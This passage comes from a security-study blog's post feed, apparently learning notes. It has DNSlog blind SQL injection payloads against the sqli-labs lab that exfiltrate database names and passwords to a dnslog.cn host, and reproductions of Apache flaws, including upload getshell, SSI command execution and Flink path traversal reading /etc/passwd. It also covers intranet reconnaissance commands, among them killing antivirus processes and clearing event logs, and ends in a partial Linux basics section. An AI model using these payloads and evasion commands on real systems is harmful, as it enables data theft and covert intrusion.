盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率</p><p>低，需要发送很多的请求进行判断，如果存在 waf 等安全防护设备，很容易被封</p><p>掉 ip，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入 使用 DnsLog 盲</p><p>注</p><h3 id="1-3-3-原理介绍"><a href="#1-3-3-原理介绍" class="headerlink" title="1.3.3 原理介绍"></a>1.3.3 原理介绍</h3><p>1.攻击者首先提交注入语句 select load_file(concat(‘\\&#39;,’攻击语句’,xxx.dnslog.cn\adb))</p><p>2.在数据库中攻击语句被执行，concat函数将执行结果与XXX.dnslog.cn\abc拼接，构成一个新的域名，而mysql中的select load_file()可以发起请求，那么这条带有数据库查询结果的域名将被提交到DNS服务器进行解析</p><p>3.此时，如果我们可以查看DNS服务器上的Dnslog 就可以得到SQL注入结果</p><p>注：仅限于windos环境，对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用，limit 来一个一个解析</p><h3 id="1-3-4-实操"><a href="#1-3-4-实操" class="headerlink" title="1.3.4 实操"></a>1.3.4 实操</h3><p>1.今天dnslog，获取子域名</p><p>2.打开sqli-labs盲注关卡（less-9）</p><p>如果不使用dnslog，网站又没有waf拦截ip，使用sqlmap，部分waf可以使用tamper参数编码绕过，但花费时间较多;</p><p>3.Dnslog 盲注</p><p>使用select load_file(concat(‘\\\&#39;,攻击语句’，xxx.dnslog\abc))构造相关语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询数据库<span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查表查 表 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查字段查 字 段 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.w40iw8.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>用点分隔，同时输出多个查询结果<span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.wbrd5d.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>查数据 <span class="token operator">and</span> load_file<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span> <span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span> <span class="token keyword">select</span> password <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.wbrd5d.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> top10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache 漏洞</title>
      <link href="2020/07/01/apache-lou-dong/"/>
      <url>2020/07/01/apache-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache漏洞"><a href="#Apache漏洞" class="headerlink" title="Apache漏洞"></a>Apache漏洞</h1><span id="more"></span><h2 id="1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#1-1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>1.1 Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)漏洞复现"></a>2)漏洞复现</h3><p>上传正常php文件截图</p><img src="/2020/07/01/apache-lou-dong/img-1.png" class="slug"><p>修改方框处 ，增加 hex码 0a</p><img src="/2020/07/01/apache-lou-dong/img-2.png" class="slug"><p>文件上传成功，访问 <a href="http://172.16.97.2:8080/evil.php%0a">http://172.16.97.2:8080/evil.php%0a</a> 发现上传成功</p><img src="/2020/07/01/apache-lou-dong/img-3.png" class="slug"><h2 id="1-2Apache-HTTPD-多后缀解析漏洞"><a href="#1-2Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="1.2Apache HTTPD 多后缀解析漏洞"></a>1.2Apache HTTPD 多后缀解析漏洞</h2><h3 id="1）漏洞原理"><a href="#1）漏洞原理" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre class="line-numbers language-none"><code class="language-none">AddType text&#x2F;html .htmlAddLanguage zh-CN .cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler application&#x2F;x-httpd-php .php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞</p><h3 id="2）漏洞复现"><a href="#2）漏洞复现" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell</p><img src="/2020/07/01/apache-lou-dong/img-4.png" class="slug"><h2 id="1-3-Apache-SSI-远程命令执行漏洞"><a href="#1-3-Apache-SSI-远程命令执行漏洞" class="headerlink" title="1.3 Apache SSI 远程命令执行漏洞"></a>1.3 Apache SSI 远程命令执行漏洞</h2><h3 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1)漏洞原理"></a>1)漏洞原理</h3><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p><h3 id="2）漏洞复现-1"><a href="#2）漏洞复现-1" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p><pre class="line-numbers language-shtml" data-language="shtml"><code class="language-shtml">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/apache-lou-dong/img-5.png" class="slug"><p>访问当前路径即可rce</p><img src="/2020/07/01/apache-lou-dong/img-6.png" class="slug"><h2 id="1-4-Apache-Flink上传路径遍历（CVE-2020-17518）"><a href="#1-4-Apache-Flink上传路径遍历（CVE-2020-17518）" class="headerlink" title="1.4 Apache Flink上传路径遍历（CVE-2020-17518）"></a>1.4 Apache Flink上传路径遍历（CVE-2020-17518）</h2><h3 id="1）漏洞原理-1"><a href="#1）漏洞原理-1" class="headerlink" title="1）漏洞原理"></a>1）漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p><p>Apache Flink 1.5.1引入了REST处理程序，该处理程序允许您通过恶意修改的HTTP HEADER将上传的文件写入本地文件系统上的任意位置。</p><h3 id="2）漏洞复现-2"><a href="#2）漏洞复现-2" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>搭建完成</p><img src="/2020/07/01/apache-lou-dong/img-7.png" class="slug"><p>访问submit New JOB 并且上传文件，在文件名处进行路径穿透</p><img src="/2020/07/01/apache-lou-dong/img-8.png" class="slug"><p>上传成功</p><img src="/2020/07/01/apache-lou-dong/img-9.png" class="slug"><h2 id="1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）"><a href="#1-5-Apache-Flinkjobmanager-logs路径遍历（CVE-2020-17519）" class="headerlink" title="1.5 Apache Flinkjobmanager/logs路径遍历（CVE-2020-17519）"></a>1.5 Apache Flink<code>jobmanager/logs</code>路径遍历（CVE-2020-17519）</h2><h3 id="1-漏洞原理-2"><a href="#1-漏洞原理-2" class="headerlink" title="1) 漏洞原理"></a>1) 漏洞原理</h3><p>Apache Flink是具有强大的流和批处理功能的开源流处理框架。</p><p>Apache Flink 1.11.0中引入的一项更改（以及1.11.1和1.11.2中也发布）允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p><p>参考：</p><ul><li><a href="https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801">https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17519">https://nvd.nist.gov/vuln/detail/CVE-2020-17519</a></li></ul><h3 id="2）漏洞复现-3"><a href="#2）漏洞复现-3" class="headerlink" title="2）漏洞复现"></a>2）漏洞复现</h3><p>访问当前路径</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">http://172.16.97.2:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/apache-lou-dong/img-10.png" class="slug"><h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="2020/07/01/nei-wang-xin-xi-shou-ji/"/>
      <url>2020/07/01/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><span id="more"></span><h2 id="1-WMIC-基础语法"><a href="#1-WMIC-基础语法" class="headerlink" title="1.WMIC 基础语法"></a>1.WMIC 基础语法</h2><h3 id="1-1-语法介绍"><a href="#1-1-语法介绍" class="headerlink" title="1.1 语法介绍"></a>1.1 语法介绍</h3><p>wmic命令行是用来管理WMI系统的， 算是win的插件 ， 用户可以使用 WMI 管理本地和远程计算机。</p><p>WMI在渗透测试中不需要下载和安装，是Windows系统自带功能，和cmd一样用</p><p>在整个运行过程都在计算机内存中发生，不会留下任何操作痕迹。</p><h3 id="1-2-简单实用"><a href="#1-2-简单实用" class="headerlink" title="1.2 简单实用"></a>1.2 简单实用</h3><h4 id="1-2-1-查看帮助"><a href="#1-2-1-查看帮助" class="headerlink" title="1.2.1 查看帮助"></a>1.2.1 查看帮助</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wmic &#x2F;?  #查看全局命令process &#x2F;? #进程管理帮助wmic process get &#x2F;?   #属性获取操作帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-2-2-常用命令"><a href="#1-2-2-常用命令" class="headerlink" title="1.2.2 常用命令"></a>1.2.2 常用命令</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取系统正在运行的进程、进程文件的路径、进程IDwmic process get caption,executablepath,processid#获取系统当前正在运行的服务wmic service where (state&#x3D;&#39;runing&#39;) get name,processid,pathname,startmode,caption#查看服务信息wmic service list brief#获取杀软详情wmic &#x2F;Node:localhost &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe &#x2F;Format:List#获取补丁信息wmic qfe get Caption,Description,HotFixID,InstalledOn#判断是否是虚拟机wmic onboarddevice get Description,DeviceType,Enabled,Status &#x2F;format:list#安装了那些软件wmic product get name,version#获取本地安装程序wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name &#x2F;FORMAT:table#系统环境变量wmic environment get Description,VariableValue#计算机品牌，型号、名称、名字wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:list#获取系统驱动情况wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status &#x2F;format:list#查看驱动器wmic logicaldisk get caption,description,providername  #查看当前操作系统wmic OS get Caption,CSDVersion,OSArchitecture,Version#查看开机自启动wmic startup get caption,command#查看共享文件wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-操作用户"><a href="#1-2-3-操作用户" class="headerlink" title="1.2.3 操作用户"></a>1.2.3 操作用户</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#搜索用户账户wmic useraccount list brief#锁定用户账号wmic useraccount where name&#x3D;&#39;hacker&#39; set disabled&#x3D;false#用户账号重命名wmic useraccount where name&#x3D;&#39;hacker&#39; rename hacker#限制用户修改密码wmic useraccount where name&#x3D;&#39;hacker&#39; set passwordchangeable&#x3D;false#搜索登录用户wmic logon list brief#搜索计算机域控制器wmic ntdomain list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-4-操作服务"><a href="#1-2-4-操作服务" class="headerlink" title="1.2.4 操作服务"></a>1.2.4 操作服务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#卸载和重装程序wmic product where &quot;name like &#39;%forit%&#39;&quot; get name#停止运行服务,主要是关闭杀软Wmic process where name&#x3D;&quot;XXX.exe&quot; call terminatewmic process where name&#x3D;&quot;explorer.exe&quot; call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-5-清理日志"><a href="#1-2-5-清理日志" class="headerlink" title="1.2.5 清理日志"></a>1.2.5 清理日志</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wmic nteventlog where filename&#x3D;&#39;system&#39; cleareventlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-本机信息"><a href="#2-本机信息" class="headerlink" title="2.  本机信息"></a>2.  本机信息</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>当主机上线时候，第一件事就是搜集有用信息，判断这是什么系统、找杀软、找漏洞来提权、判断内网等等。</p><p>而不是无头苍蝇，上来就乱搞一通。</p><h3 id="2-2-命令"><a href="#2-2-命令" class="headerlink" title="2.2 命令"></a>2.2 命令</h3><h4 id="2-2-1-系统与配置信息"><a href="#2-2-1-系统与配置信息" class="headerlink" title="2.2.1 系统与配置信息"></a>2.2.1 系统与配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主机信息hostname #查看当前操作系统，重点查看版本、位数、补丁信息systeminfo systeminfo | findstr &#x2F;B &#x2F;C:&quot;Os Name&quot; &#x2F;C:&quot;OS Version&quot;#查看系统架构echo %PROCESSOR_ARCHITECTURE%#查看驱动情况DRIVERQUERY#查看磁盘驱动器，有几个磁盘wmic logicaldisk get caption,description,providername#host 信息type C:\\windows\system32\drivers\etc\hosts#如果安装iis服务器可以查看iis配置信息type C:\\windows\system32\inetsrv\config\applicationHost.config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-2-软件与进程信息"><a href="#2-2-2-软件与进程信息" class="headerlink" title="2.2.2 软件与进程信息"></a>2.2.2 软件与进程信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主要是看安装软件和版本信息，查响应版本漏洞wmic product get name,version#查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀软等tasklist &#x2F;svcwmic process list brief#查看AV安装情况wmic &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List#已启动程序的信息，查看开机自启动wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-3-服务信息"><a href="#2-2-3-服务信息" class="headerlink" title="2.2.3 服务信息"></a>2.2.3 服务信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看启动的服务net start#查看服务信息q#查询服务的详细信息sc querys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-4-计划任务"><a href="#2-2-4-计划任务" class="headerlink" title="2.2.4 计划任务"></a>2.2.4 计划任务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">schtasks #计划任务参考参数&#x2F;Create  # 创建计划任务&#x2F;Delete  #删除计划任务&#x2F;Query #显示所有的计划任务&#x2F;Change  #更改计划任务&#x2F;Run。# 运行计划任务&#x2F;End。#终止当前计划任务&#x2F;ShowSid  #显示与计划任务名称相应的安全标识符&#x2F;？  #显示此帮助消息#查询所有的计划任务schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-5-用户信息"><a href="#2-2-5-用户信息" class="headerlink" title="2.2.5 用户信息"></a>2.2.5 用户信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看主机开机时间net statistics workstation#查询已经在线用户，注意管理员是否在线query user || qwinstaquery session #查看当前用户权限，主要是判断现在是本地平台用户、本地管理员、还是域内用户whoamiwhoami &#x2F;all# 查看本地用户列表，推测命名规则net user#查看所有组名，net localgroup#然后可以查看指定组中的成员列表，比如查询本地管理员组看到本地一个管理员，还一个域的Domainadmins为域内机器的本地管理员用户net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-6-网络配置信息"><a href="#2-2-6-网络配置信息" class="headerlink" title="2.2.6 网络配置信息"></a>2.2.6 网络配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看网络信息ipconfig &#x2F;all#查看路由器和路由表，可以判断内网的地址段route printarp -A#查看主机共享列表，可访问的共享列表net sharewmic share get name,path,status#查看主机开放端口以及链接状态，TCP&#x2F;UDPnetstat -anonetstat -anob #查看对应的程序，需要权限#通过注册表查看代理情况REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3域信息收集"><a href="#3域信息收集" class="headerlink" title="3域信息收集"></a>3域信息收集</h2><h3 id="3-1-域内信息收集"><a href="#3-1-域内信息收集" class="headerlink" title="3.1 域内信息收集"></a>3.1 域内信息收集</h3><h4 id="3-1-1主机信息收集"><a href="#3-1-1主机信息收集" class="headerlink" title="3.1.1主机信息收集"></a>3.1.1主机信息收集</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell systeminfo #查看主机信息，存在域信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/07/01/nei-wang-xin-xi-shou-ji/img-1.png" class="slug"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取域名ipshell nslookup god.orgping god.org #查询当前会话登陆的是域还是本地工作组，是域的话可以查DNS和域用户信息shell config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2020/07/01/nei-wang-xin-xi-shou-ji/img-2.png" class="slug"><h4 id="3-1-2域基本信息查询"><a href="#3-1-2域基本信息查询" class="headerlink" title="3.1.2域基本信息查询"></a>3.1.2域基本信息查询</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell net view #查看工作组内主机shell net view&#x2F;domain #查看有几个域shell net view&#x2F;domain：god.org  #查看指定域内主机shell net accounts &#x2F;domain   #获取域密码策略shell nltest &#x2F;domain_trusts #获取域信任信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-3-域内用户和管理员信息"><a href="#3-1-3-域内用户和管理员信息" class="headerlink" title="3.1.3.域内用户和管理员信息"></a>3.1.3.域内用户和管理员信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net user &#x2F;domain #查询域内用户列表net user Administrator &#x2F;domamin # 查询指定域用户信息net group &#x2F;doamin  #查看域内的组，判断每个组的功能net group &quot;domain admins&quot; &#x2F;domain #查询域管理员组内的用户net group &quot;Domain computers&quot; &#x2F;domain  #查询域成员计算机列表，对应的是主机的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-4判断主域（域控）"><a href="#3-1-4判断主域（域控）" class="headerlink" title="3.1.4判断主域（域控）"></a>3.1.4判断主域（域控）</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net time &#x2F;domain #域服务器一般会作为时间服务器使用，就可以获得域控地址存在域，但当前用户不是域用户会拒绝访问；是域用户就获得相应地址；显示找不到域则是工作组环境ping DC.domain.test #通过ping获取域控nltest &#x2F;DCLIST:domainnetdom query pdcnet group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 基础</title>
      <link href="2020/06/10/linux-ji-chu/"/>
      <url>2020/06/10/linux-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-学习笔记"><a href="#Linux-学习笔记" class="headerlink" title="Linux 学习笔记"></a>Linux 学习笔记</h1><span id="more"></span><h2 id="1-根目录解析"><a href="#1-根目录解析" class="headerlink" title="1 根目录解析"></a>1 根目录解析</h2><ul><li><p>/ 根目录</p><p>每个文件和目录都是从这里开始，只有root用户具有该目录下的写权限，此目录不同于/root，/root目录是root用户的主目录</p></li><li><p>/bin 用户二进制文件</p><p>包含二进制可执行文件，系统所有的用户使用的命令都设置在这里，如ps，ls，ping</p></li><li><p>/sbin。系统二进制文件</p><p>就像/bin，/sbin同样包含二进制可执行文件。但是这个目录下的linux命令通常由系统管理员使用，对系统进行维护，如：iptables，reboot，fdisk。ifconfig</p></li><li><p>/etc 配置文件</p><p>包含所有程序所需的配置文件，也包含了用于启动/停止单个程序的启动和关闭的shell脚本，如：/etc/resolv.conf</p></li><li><p>/dev 设置文件</p><p>这些包括终端设备，USB或链接到系统的任何设备</p></li><li><p>/proc 进程信息</p><p>这个是一个虚拟的文件系统，包含有关正在运行的进程信息，如：/proc/「pid」包含与特定pid的相关信息</p></li><li><p>/var 变量文件</p><p>这个目录下可以找到内容可能增长的文件，如系统日志文件/var/log ，数据库文件/var/lib打印队列/var/spool</p></li><li><p>/tmp 临时文件</p><p>包含系统和用户创建的临时文件，当系统重新启动时，这个目录下的文件都将被删除</p></li><li><p>/usr 用户程序</p><ul><li><p>包含二进制文件、库文件、文档和二级程序的源代码。</p><p>/usr/bin中包含用户程序的二进制文件。如果你在/bin中找不到用户二进制文件，到/usr/bin目录看看。例如：at、awk、cc、less、scp。</p><p>/usr/sbin中包含系统管理员的二进制文件。如果你在/sbin中找不到系统二进制文件，到/usr/sbin目录看看。例如：atd、cron、sshd、useradd、userdel。</p><p>/usr/lib中包含了/usr/bin和/usr/sbin用到的库。</p><p>/usr/local中包含了从源安装的用户程序。例如，当你从源安装Apache，它会在/usr/local/apache2中。</p></li></ul></li><li><p>/home - HOME目录</p><p>所有用户用home目录来存储他们的个人档案。</p></li><li><p>/boot - 引导加载程序文件</p></li></ul><p>包含引导加载程序相关的文件，内核的initrd、vmlinux、grub文件位于/boot下。</p><ul><li><p>/lib - 系统库</p><p>包含支持位于/bin和/sbin下的二进制文件的库文件。</p></li><li><p>/opt - 可选的附加应用程序</p><p>opt代表opitional，包含从个别厂商的附加应用程序，附加应用程序应该安装在/opt/或者/opt/的子目录下。</p></li><li><p>/mnt - 挂载目录</p><p>临时安装目录，系统管理员可以挂载文件系统。</p></li><li><p>/media - 可移动媒体设备</p><p>用于挂载可移动设备的临时目录。举例来说，挂载CD-ROM的/media/cdrom，挂载软盘驱动器</p><p>的/media/floppy</p></li><li><p>/srv - 服务数据</p><p>包含服务器特定服务相关的数据。</p></li></ul><h2 id="2-日志文件"><a href="#2-日志文件" class="headerlink" title="2 日志文件"></a>2 日志文件</h2><table><thead><tr><th>日志文件</th><th>说 明</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>记录与系统定时任务相关的曰志</td></tr><tr><td>/var/log/cups/</td><td>记录打印信息的曰志</td></tr><tr><td>/var/log/dmesg</td><td>记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>/var/log/btmp</td><td>记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。命令如下： [root@localhost log]#lastb root tty1 Tue Jun 4 22:38 - 22:38 (00:00) #有人在6月4 日 22:38便用root用户在本地终端 1 登陆错误</td></tr><tr><td>/var/log/lasllog</td><td>记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看</td></tr><tr><td>/var/Iog/mailog</td><td>记录邮件信息的曰志</td></tr><tr><td>/var/log/messages</td><td>它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 